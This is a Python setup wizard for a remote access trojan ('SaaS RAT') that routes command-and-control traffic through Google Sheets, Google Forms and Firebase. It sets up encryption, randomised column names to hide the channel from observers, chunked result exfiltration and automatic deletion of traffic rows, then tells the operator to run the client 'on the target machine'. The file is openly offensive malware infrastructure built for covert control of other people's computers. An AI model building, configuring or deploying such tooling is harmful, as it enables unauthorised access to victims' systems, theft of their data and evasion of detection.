#!/usr/bin/env python3
"""
setup_wizard.py — interactive setup wizard for SaaS RAT

Usage:
    python setup_wizard.py
"""

import os
import random
import string
import sys


# ── Registries ───────────────────────────────────────────────────────────────
# Add new channel/crypto/fragmenter wizards here as they are implemented.

def _build_registries():
    from wizard.crypto.plaintext import PlaintextWizard
    from wizard.crypto.fernet import FernetWizard
    from wizard.fragmenter.passthrough import PassthroughWizard
    from wizard.fragmenter.fixed import FixedWizard
    from wizard.channel.sheets import SheetsWizard
    from wizard.channel.firebase import FirebaseWizard

    return {
        "crypto": {
            "plaintext": ("No encryption — cleartext values in sheet (debug/demo)", PlaintextWizard),
            "fernet":    ("Fernet encryption — AES + HMAC, recommended for ops use", FernetWizard),
        },
        "fragmenter": {
            "passthrough": ("No fragmentation — result sent in a single write", PassthroughWizard),
            "fixed":       ("Fixed-size chunks — one fragment per poll cycle",   FixedWizard),
        },
        "channel": {
            "sheets":   ("Google Sheets + Forms — C2 traffic via docs.google.com", SheetsWizard),
            "firebase": ("Firebase Realtime Database — C2 traffic via firebaseio.com", FirebaseWizard),
        },
    }


# ── Obfuscation ───────────────────────────────────────────────────────────────

INBOX_FIELDS  = ["command_id", "command", "payload", "target", "status", "created_at"]
OUTBOX_FIELDS = ["command_id", "client_id", "status", "result", "timestamp"]


def _random_name(length=5):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _generate_obfuscation():
    return {
        "inbox":  {f: _random_name() for f in INBOX_FIELDS},
        "outbox": {f: _random_name() for f in OUTBOX_FIELDS},
    }


# ── .env writer ───────────────────────────────────────────────────────────────

_ENV_SECTIONS = [
    ("Google Spreadsheet",     ["SPREADSHEET_ID", "INBOX_GID", "OUTBOX_GID"]),
    ("Google Forms — Outbox",  ["FORMS_URL", "FORMS_FIELD_MAP"]),
    ("Google Forms — Inbox",   ["INBOX_FORMS_URL", "INBOX_FORMS_FIELD_MAP"]),
    ("Encryption",             ["ENCRYPTION_METHOD", "ENCRYPTION_KEY"]),
    ("Column obfuscation",     ["INBOX_COLUMN_MAP", "OUTBOX_COLUMN_MAP"]),
    ("Firebase field obfuscation", ["FIREBASE_INBOX_COLUMN_MAP", "FIREBASE_OUTBOX_COLUMN_MAP"]),
    ("Fragmentation",          ["FRAGMENT_METHOD", "FRAGMENT_CHUNK_SIZE"]),
    ("Sheets cleanup",         ["GOOGLE_SERVICE_ACCOUNT_JSON"]),
    ("OpenAI",                 ["OPENAI_API_KEY"]),
    ("Client",                 ["CLIENT_ID"]),
]


def _write_env(env: dict, path=".env"):
    lines = []
    written = set()

    for title, keys in _ENV_SECTIONS:
        section_lines = [f"{k}={env[k]}" for k in keys if env.get(k)]
        if section_lines:
            lines += [f"# {'─' * 44}", f"# {title}", f"# {'─' * 44}"]
            lines += section_lines
            lines.append("")
            written.update(keys)

    # Any keys not covered by a section
    for k, v in env.items():
        if k not in written and v:
            lines.append(f"{k}={v}")

    with open(path, "w") as f:
        f.write("\n".join(lines).rstrip() + "\n")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    from wizard import core

    reg = _build_registries()

    # ── Welcome ───────────────────────────────────────────────────────────────
    core.section("Sheets C2 — Setup Wizard")
    core.info("This wizard writes your .env file step by step.")
    core.info("Keep a browser open to Google Sheets and Google Forms — you")
    core.info("will be prompted to create resources and copy values from them.")
    core.info()

    if os.path.exists(".env"):
        core.warn(".env already exists.")
        if not core.ask_yn("Back it up as .env.bak and continue?", default=True):
            core.info("Aborted — existing .env unchanged.")
            sys.exit(0)
        os.rename(".env", ".env.bak")
        core.success("Backed up .env → .env.bak")

    env = {}

    # ── Step 1: Encryption ────────────────────────────────────────────────────
    core.section("Step 1 — Encryption")
    crypto_choice = core.ask_choice(
        "Choose encryption method:",
        {k: label for k, (label, _) in reg["crypto"].items()},
    )
    env.update(reg["crypto"][crypto_choice][1]().setup())
    core.success(f"Encryption: {crypto_choice}")

    # ── Step 2: Column obfuscation ────────────────────────────────────────────
    core.section("Step 2 — Column Obfuscation")
    core.info("Replaces logical column names (command_id, status, etc.) with random")
    core.info("short strings — makes the sheet structure unreadable to an observer.")
    core.info("Set this up before creating the sheet so you use the right names.")
    core.info()

    obfuscation = {}
    if core.ask_yn("Enable column obfuscation?", default=False):
        obfuscation = _generate_obfuscation()
        core.info()
        core.info("Generated column name mapping — use these names in your sheet and forms:")
        core.info()
        core.info("  Inbox columns:")
        for logical, rand in obfuscation["inbox"].items():
            core.info(f"    {logical:<20} →  {rand}")
        core.info()
        core.info("  Outbox columns:")
        for logical, rand in obfuscation["outbox"].items():
            core.info(f"    {logical:<20} →  {rand}")
        core.info()
        core.pause("Take note of these names, then press Enter to continue")
        core.success("Column obfuscation enabled")
    else:
        core.success("Column obfuscation disabled — logical names will be used")

    # ── Step 3: Channel setup ─────────────────────────────────────────────────
    core.section("Step 3 — Channel Setup")
    selected = core.ask_multi(
        "Which channels do you want to configure?",
        {k: label for k, (label, _) in reg["channel"].items()},
    )

    if not selected:
        core.warn("No channels selected — skipping channel setup.")
        core.warn("You will need to set channel env vars manually before running.")
    else:
        for key in selected:
            label, cls = reg["channel"][key]
            core.section(f"Channel — {label}")
            env.update(cls().setup(obfuscation))
            core.success(f"{label} configured")

    # ── Step 4: Fragmentation ─────────────────────────────────────────────────
    core.section("Step 4 — Fragmentation")
    frag_choice = core.ask_choice(
        "Choose fragmentation method:",
        {k: label for k, (label, _) in reg["fragmenter"].items()},
    )
    env.update(reg["fragmenter"][frag_choice][1]().setup())
    core.success(f"Fragmentation: {frag_choice}")

    # ── Step 5: Extras ────────────────────────────────────────────────────────
    core.section("Step 5 — Extras")

    openai_key = core.ask_optional("OpenAI API key (required for: python server.py ai)")
    if openai_key:
        env["OPENAI_API_KEY"] = openai_key
        core.success("OpenAI API key saved")

    client_id = core.ask_optional("Client ID override (default: NADAV)")
    if client_id:
        env["CLIENT_ID"] = client_id
        core.success(f"Client ID: {client_id}")

    if "sheets" in selected:
        core.section("Step 5b — Sheets Cleanup")
        core.info("Inbox and outbox rows accumulate over time. Choose a cleanup strategy:")
        core.info()
        core.info("  A) Service account — deletes each row immediately after the result")
        core.info("     is confirmed. Requires GCP setup. Slower (API call per delete).")
        core.info()
        core.info("  B) Apps Script trigger — scheduled batch cleanup on a timer.")
        core.info("     No GCP setup needed. Faster (runs inside Google). Recommended.")
        core.info()
        core.info("  C) Skip — manual cleanup only (run cleanupAll() in script.google.com).")
        core.info()

        cleanup_choice = core.ask_choice(
            "Choose cleanup method:",
            {
                "sa":     "Service account  (per-message, automatic)",
                "script": "Apps Script trigger  (scheduled batch, no GCP needed)",
                "none":   "Skip",
            },
        )

        if cleanup_choice == "sa":
            core.info()
            core.info("Complete every step before pressing Enter at the end.")
            core.info()
            core.info("Enable the API (required — without this gspread will fail):")
            core.info("  1. Go to https://console.cloud.google.com")
            core.info("  2. If you have no project: project dropdown → New Project → Create")
            core.info("  3. APIs & Services → Enable APIs and Services")
            core.info("  4. Search 'Google Sheets API' → Enable")
            core.info("     (Google Drive API is NOT required — Sheets API alone is enough)")
            core.info()
            core.info("Create a service account:")
            core.info("  5. IAM & Admin → Service Accounts → Create Service Account")
            core.info("  6. Give it any name (e.g. c2-cleanup) → Done")
            core.info("  7. Click the service account → Keys tab → Add Key → JSON → Create")
            core.info("  8. Save the downloaded JSON file somewhere on this machine")
            core.info()
            core.info("Share the spreadsheet with the service account:")
            core.info("  9. Open the JSON file and copy the 'client_email' value")
            core.info("     (looks like: c2-cleanup@your-project.iam.gserviceaccount.com)")
            core.info(" 10. Open your Google Sheet → Share → paste that email → Editor → Send")
            core.info()
            core.info("Note: each row delete is an API call from this machine — expect")
            core.info("~1-2s latency after each result. This is normal behaviour.")
            core.info()
            core.pause("Complete all steps above, then press Enter to continue")

            def _validate_sa_path(v):
                import os as _os
                if not _os.path.exists(v):
                    return f"File not found: {v}"
                if not v.endswith(".json"):
                    return "Expected a .json file"

            sa_path = core.ask(
                "Path to service account JSON key file",
                validator=_validate_sa_path,
            )
            env["GOOGLE_SERVICE_ACCOUNT_JSON"] = sa_path
            core.success("Service account cleanup enabled — rows deleted per confirmed result")

        elif cleanup_choice == "script":
            from wizard.channel.sheets import _build_cleanup_script

            def _validate_hours(v):
                try:
                    n = int(v)
                    if n < 1 or n > 168:
                        return "Enter a number between 1 and 168"
                except ValueError:
                    return "Must be a whole number"

            hours = core.ask(
                "Cleanup interval in hours",
                default="6",
                validator=_validate_hours,
            )

            sid  = env.get("SPREADSHEET_ID", "")
            igid = env.get("INBOX_GID", "0")
            ogid = env.get("OUTBOX_GID", "0")

            try:
                cleanup_script = _build_cleanup_script(
                    spreadsheet_id=sid,
                    inbox_gid=int(igid),
                    outbox_gid=int(ogid),
                    cleanup_hours=int(hours),
                )
                with open("sheets_c2_cleanup.gs", "w") as f:
                    f.write(cleanup_script)
                core.info()
                core.success(f"Cleanup script written → sheets_c2_cleanup.gs  (every {hours}h)")
                core.info()
                core.info("To activate:")
                core.info("  1. Go to https://script.google.com — create a new project")
                core.info("  2. Paste the contents of sheets_c2_cleanup.gs")
                core.info("  3. Run installTrigger() once — cleanup runs every "
                          f"{hours} hour(s) automatically")
                core.info("  4. Run cleanupAll() at any time for an immediate manual sweep")
                core.info("  5. Run removeTrigger() to disable the schedule")
            except Exception as e:
                core.warn(f"Could not write cleanup script: {e}")

        else:
            core.success("Cleanup skipped — use cleanupAll() in script.google.com when needed")

    # ── Step 6: Summary + write ───────────────────────────────────────────────
    core.section("Step 6 — Summary")
    core.info("Values to be written to .env:")
    core.info()
    for k, v in env.items():
        display = v if len(v) <= 60 else v[:57] + "..."
        core.info(f"  {k}={display}")
    core.info()

    if not core.ask_yn("Write .env?", default=True):
        core.warn("Aborted — nothing written.")
        sys.exit(0)

    _write_env(env)
    core.success(".env written")

    # ── Done ──────────────────────────────────────────────────────────────────
    core.section("Done")
    core.info("On the target machine:")
    core.info("  python client.py")
    core.info()
    core.info("On the operator machine:")
    core.info("  python server.py ai")
    core.info("  python server.py send --command system_info")
    core.info()


if __name__ == "__main__":
    main()
